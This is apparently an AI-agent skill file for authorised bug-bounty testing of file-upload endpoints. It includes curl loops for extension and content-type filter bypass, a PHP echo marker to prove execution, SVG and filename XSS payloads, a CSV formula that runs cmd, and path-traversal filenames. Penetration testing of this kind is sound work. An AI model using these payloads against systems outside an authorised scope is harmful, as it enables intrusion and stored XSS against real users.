---
name: zp-upload
description: ZeroProtocol hunter for unrestricted and unsafe file upload. Use when any endpoint accepts a file - avatars, attachments, imports, documents, images - when testing extension or content-type filters, when hunting upload-to-RCE or stored XSS via uploaded files, when checking where uploaded files are served from, or when probing image-processing libraries. Also covers path traversal in filenames and the access-control of other users' uploads.
---

# zp-upload - what happens after it lands

**Phase:** 5 | **Gate:** **active.** `zp-scope check <target>` must exit 0. Exit 1 refuse ·
3 stop · 4 stop.

An upload is only a finding once you know **where the file went, what serves it, and with what
Content-Type**. A shell that lands in an S3 bucket behind a CDN that serves
`application/octet-stream` is not RCE and not XSS. Find the retrieval URL first; it decides
everything.

---

## Procedure

**1. Baseline a legitimate upload and follow it all the way back.**

```bash
printf 'zp-canary-91234' > ok.txt
curl -sk -X POST "https://$H/api/upload" -H "Authorization: Bearer $TOK_A" \
  -F 'file=@ok.txt;type=text/plain' -o up.json; jq . up.json
URL=$(jq -r '.url // .path // .location' up.json)
curl -skI "$URL" | grep -iE '^HTTP|content-type|content-disposition|x-content-type-options|cache-control'
```

| What you learn | Why it decides the hunt |
|---|---|
| served from the app's own origin | XSS and RCE are both live possibilities |
| served from a separate CDN/bucket domain | XSS is limited to that origin - check what it holds |
| `Content-Disposition: attachment` | browser downloads instead of rendering: XSS mostly dead |
| `X-Content-Type-Options: nosniff` | no MIME-sniffing tricks |
| filename preserved verbatim | traversal and double-extension tricks are in play |
| filename randomised (UUID) | you must retrieve the new name; no path guessing |
| predictable path (`/uploads/<uid>/<name>`) | check other users' files -> `zp-idor` |

**2. Probe the filter, and learn *which* filter it is.**

```bash
for spec in "s.php:application/x-php" "s.php:image/png" "s.PhP:image/png" \
            "s.php.png:image/png" "s.png.php:image/png" "s.phtml:image/png" \
            "s.php5:image/png" "s.svg:image/svg+xml" "s.html:text/html" \
            "s.xml:text/xml" "s.jsp:image/png" "s.aspx:image/png" "s.htaccess:text/plain"; do
  n=${spec%%:*}; t=${spec##*:}
  printf '%-16s %-24s ' "$n" "$t"
  curl -sk -X POST "https://$H/api/upload" -H "Authorization: Bearer $TOK_A" \
    -F "file=@ok.txt;filename=$n;type=$t" -o /dev/null -w '%{http_code}\n'
done
```

Then the structural tricks:

```
extension:     .php.png  .png.php  .pHp  .php5 .phtml .phar  .php%00.png  .php/  .php.
                trailing space or dot: "s.php "  "s.php."
content-type:  declare image/png on a .php · declare application/x-php on a .png
magic bytes:   prepend GIF89a; or the PNG header \x89PNG\r\n\x1a\n before the payload
multipart:     two `filename=` attributes · a `;` or newline in the filename
                Content-Disposition with quoted/encoded name: filename="s.php"; filename*=UTF-8''s.php
archive:       zip containing ../../shell.php (zip-slip) · symlink inside a tar
```

**3. Verify execution, not upload.** A `200` on upload means nothing.

```bash
# the only proof that matters: fetch it back and see the server interpret it
printf 'GIF89a;<?php echo "zp-exec-91234"; ?>' > s.php.png
# upload, then:
curl -sk "$URL" | grep -q 'zp-exec-91234' && echo "CODE EXECUTED -> RCE"
curl -sk "$URL" | grep -q '<?php'          && echo "served as source, not executed - not RCE"
```

If the payload comes back verbatim with `<?php` visible, the file is being served as static
content. That is not RCE. It may still be stored XSS if the Content-Type allows.

**Keep the payload to an `echo`.** A one-line marker proves arbitrary code execution as
completely as a webshell does, and leaves nothing behind. Never upload a webshell, a reverse
shell, or anything that accepts commands.

**4. Stored XSS via upload - often easier than RCE and frequently overlooked.**

```
SVG           <svg xmlns="http://www.w3.org/2000/svg" onload="alert(91234)"/>
HTML          plain .html with a script - works when served inline from the app origin
XML           served as text/xml can render script in some browsers
PDF           JS in a PDF, when rendered inline by the browser's viewer
CSV           formula injection: =cmd|'/c calc'!A0  — impacts the person who opens it in Excel
filename      "><img src=x onerror=alert(91234)>.png   — if the filename is rendered anywhere
image meta    payload in EXIF Comment, surfaced by a gallery that prints metadata
```

SVG is the highest-yield: it is an image to the upload filter and a document to the browser.
Confirm it renders **inline** from the app's own origin - that is what makes it session-relevant.

**5. Path traversal in the filename.**

```bash
for n in '../../../../tmp/zp91234.txt' '..%2f..%2fzp91234.txt' \
         '....//....//zp91234.txt' '/absolute/zp91234.txt' '..\..\zp91234.txt'; do
  curl -sk -X POST "https://$H/api/upload" -H "Authorization: Bearer $TOK_A" \
    -F "file=@ok.txt;filename=$n" -o /dev/null -w "$n -> %{http_code}\n"
done
```

Write **only** to `/tmp` or a path you can verify is unused. Never target a real application
file - overwriting `index.php` or a config is destruction, not proof.

**6. Image-processing and conversion sinks.** The library is often the vulnerability.

```
ImageMagick   ImageTragick-class issues via MVG/MSL/SVG delegates - check the version first
Ghostscript   PostScript escapes in an uploaded EPS/PDF
ffmpeg        HLS/SSRF via a crafted playlist file - reads local files into the output
LibreOffice   macro and external-link handling in converted documents
ExifTool      known argument-injection/RCE classes - check the version
zip/tar       zip-slip and symlink extraction
```

Identify the version from response headers, output metadata, or an error, and check it against
known CVEs before crafting anything - a known CVE on an old version is a clean, fast report.

**7. Everything else the upload touches.**

```
size/DoS          DO NOT test. Excluded by essentially every program
other users' files  GET /uploads/<B_UID>/<name> as A   -> zp-idor
listable directory  GET /uploads/   -> information disclosure
antivirus bypass    only relevant if the program says files are scanned
re-upload/overwrite can you replace another user's file by name?
SSRF on "import from URL"  -> zp-ssrf
XXE in DOCX/XLSX/SVG       -> zp-xxe-lfi
```

---

## Confirm or kill

| Evidence | Verdict |
|---|---|
| uploaded code executes when fetched | **confirmed RCE.** Critical. Delete the file, report now |
| SVG/HTML renders script inline from the app origin | **confirmed stored XSS.** High |
| file served with `Content-Disposition: attachment` | XSS killed. Check for other impacts |
| file served from an isolated bucket origin | XSS severity drops sharply - state what that origin holds |
| payload returned verbatim as text | stored, not executed. Not RCE |
| 200 on upload, file not retrievable | **nothing yet.** Find the retrieval path or you have no finding |
| traversal wrote outside the upload dir | confirmed arbitrary write. High to Critical |
| A can read B's uploads | that is `zp-idor`, and often the easier report |
| dangerous extension accepted but stored outside the webroot | not RCE. Say so |
| CSV formula injection | real but commonly Low/N-A - check the program's stance first |
| upload directory lists | information disclosure, Low to Medium |

**The dominant false positive:** reporting "unrestricted file upload" because a `.php` was
accepted. If it is not reachable, not executed, and not rendered, there is no impact. Retrieve
it or drop it.

---

## High-value patterns

- **SVG avatar rendered inline on the main origin** - stored XSS on every profile viewer.
- **A document converter shelling out to ImageMagick/Ghostscript/ffmpeg** on an old version.
- **An import feature writing into a directory that is also served** - the classic upload-to-RCE.
- **Predictable upload paths across tenants** - `zp-idor` on every customer's documents.
- **Filename reflected in a UI** - XSS with no file interpretation needed at all.
- **Zip import with zip-slip** - arbitrary write, frequently overlooked.
- **Profile-picture endpoints on legacy subdomains** - old code, weak filters.

---

## Pitfalls

- **Uploading a webshell or reverse shell.** An `echo` marker proves the same thing safely.
- **Testing upload size limits or ZIP bombs.** That is DoS.
- **Overwriting a real application file** to prove arbitrary write. Write to `/tmp`.
- **Reporting an accepted extension with no retrieval path.**
- **Claiming XSS on a file served as `attachment`** or from a sandboxed origin.
- **Leaving your files behind.** Delete every one, and say so in the report.
- **Uploading anything illegal or offensive** as a test file. Use a text canary.
- **Missing the simplest win** - the filename rendered in the UI.
- **Ignoring where it is served from.** That single fact decides the whole severity.

---

## Hand off to

RCE -> `zp-rce-ssti` for the impact framing, then `zp-triage` and `zp-report` immediately.
Stored XSS -> `zp-xss` for browser proof and the escalation chain.
SVG/DOCX XXE -> `zp-xxe-lfi`. Other users' files -> `zp-idor`.
Import-from-URL -> `zp-ssrf`. Bucket-hosted uploads -> `zp-cloud`.
